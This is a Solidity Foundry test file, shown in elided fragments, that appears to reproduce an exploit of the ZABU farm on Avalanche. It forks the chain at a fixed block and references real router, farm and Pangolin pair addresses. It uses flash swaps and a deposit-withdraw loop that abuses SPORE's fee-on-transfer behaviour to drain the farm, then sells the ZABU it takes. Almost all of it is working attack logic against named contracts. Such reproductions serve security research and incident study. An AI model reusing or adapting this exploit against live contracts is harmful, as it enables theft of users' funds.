...
contract depositToken {
    ...
    IUniswapV2Router Router =
        IUniswapV2Router(payable(0xE54Ca86531e17Ef3616d22Ca28b0D458b6C89106));
    ZABUFarm Farm = ZABUFarm(0xf61b4f980A1F34B55BBF3b2Ef28213Efcc6248C4);

    function depositSPORE() external payable {
        (bool success, ) = address(WAVAX).call{value: 1 ether}("");
...
contract ContractTest is Test {
    ...
    IUniswapV2Router Router =
        IUniswapV2Router(payable(0xE54Ca86531e17Ef3616d22Ca28b0D458b6C89106));
    ZABUFarm Farm = ZABUFarm(0xf61b4f980A1F34B55BBF3b2Ef28213Efcc6248C4);
    IUniswapV2Pair PangolinPair1 =
        IUniswapV2Pair(0x0a63179a8838b5729E79D239940d7e29e40A0116); // SPORE WAVAX
    IUniswapV2Pair PangolinPair2 =
        IUniswapV2Pair(0xad24a72ffE0466399e6F69b9332022a71408f10b); // SPORE PNG
    ...
    function setUp() public {
        vm.createSelectFork("Avalanche", 4_177_751);
    }
    ...
    function testExploit() public payable {
        ...
        (bool success4, ) = address(WAVAX).call{value: 2500 ether}("");
        // depost SPORE
        ContractFactory();
        (bool success2, ) = addressContract.call{value: 1 ether}(
            abi.encodeWithSignature("depositSPORE()")
        );
        //require(success1);
        require(success4);
        // change block.number
        ...
        PangolinPair1.swap(
            SPORE.balanceOf(address(PangolinPair1)) - 1 * 1e18,
            0,
            address(this),
            new bytes(1)
        );
        ...
        (bool success1, ) = addressContract.call(
            abi.encodeWithSignature("withdrawSPORE()")
        );
        require(success1);
        ...
        (bool success3, ) = addressContract.call(
            abi.encodeWithSignature("sellZABU()")
        );
        require(success3);
    ...
    function pangolinCall(
        ...
        if (msg.sender == address(PangolinPair1)) {
            ...
            uint256 amountWAVAX = (((reserve0Pair1 * reserve1Pair1) /
                ((SPOREInPair1 * 1000 - (amountSPORE0 * 3 * 96) / 100) / 1000) -
                WAVAXInPair1) * 1000) / 997;
        ...
        if (msg.sender == address(PangolinPair2)) {
            ...
            while (SPORE.balanceOf(address(Farm)) > 1000) {
                ...
                if (
                    (SPORE.balanceOf(address(this)) * 6) / 100 >
                    SPORE.balanceOf(address(Farm))
                ) {
            ...
            uint256 amountPNG = (((reserve0Pair2 * reserve1Pair2) /
                ((SPOREInPari2 * 1000 - (amountSPORE1 * 3 * 96) / 100) / 1000) -
                PNGInPair2) * 1000) / 997;
            buyPNG(amountPNG);
